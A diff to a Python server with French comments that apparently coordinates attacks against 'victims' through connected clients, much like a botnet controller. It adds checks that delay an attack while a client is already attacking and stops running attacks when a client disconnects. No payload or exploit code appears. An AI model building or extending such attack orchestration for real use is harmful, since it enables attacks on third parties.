@@ -155,11 +155,15 @@ def start_server(port, logger):
             number_of_attackers = 0
 
             for victim_uid in victims_uid:
-                for client in clients:
-                    if client['uid'] == victim_uid[0]:
-                        execute_attack(client, attack)
-                        attack_sent = True
-                        number_of_attackers += 1
+                if is_attacking(mycursor, victim_uid):
+                    print("[!] delaying attack, client is already attacking")
+
+                else :
+                    for client in clients:
+                        if client['uid'] == victim_uid[0]:
+                            execute_attack(client, attack)
+                            attack_sent = True
+                            number_of_attackers += 1
 
             
             # Mise à jour de l'attaque si elle a été envoyée au moins une fois
@@ -200,22 +204,26 @@ def start_server(port, logger):
             for victim in victims:
                 victim_uid = victim[0]
                 for client in clients:
-                    print("[+] executing victim attack :")
-                    print("\t[+]", str(attack[2]))
-                    
-                    try:
-                        execute_attack(client, attack)
-                        logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
-                    except Exception as e:
-                        logger.error("erreur lors de l'envoi de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid) + " : " + str(e))
+                    if is_attacking(mycursor, victim_uid):
+                        print("[!] delaying attack, client is already attacking")
 
-                    # Mise à jour de l'attaque
-                    query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
-                    values = (attack[0], )
+                    else :
+                        print("[+] executing victim attack :")
+                        print("\t[+]", str(attack[2]))
+                        
+                        try:
+                            execute_attack(client, attack)
+                            logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
+                        except Exception as e:
+                            logger.error("erreur lors de l'envoi de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid) + " : " + str(e))
 
-                    mycursor.execute(query, values)
+                        # Mise à jour de l'attaque
+                        query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
+                        values = (attack[0], )
 
-                    db.commit()
+                        mycursor.execute(query, values)
+
+                        db.commit()
             
         #######################
 
@@ -234,6 +242,9 @@ def start_server(port, logger):
 
                     # Mise à jour du statut dans la base de données
                     update_status(db, mycursor, client['uid'])
+
+                    # On exit les attaques en cours
+                    exit_attacks(db, mycursor, client['uid'])
 
                     # Arrêt du thread d'émission
                     client['emission_queue'].put(b"stop-thread")
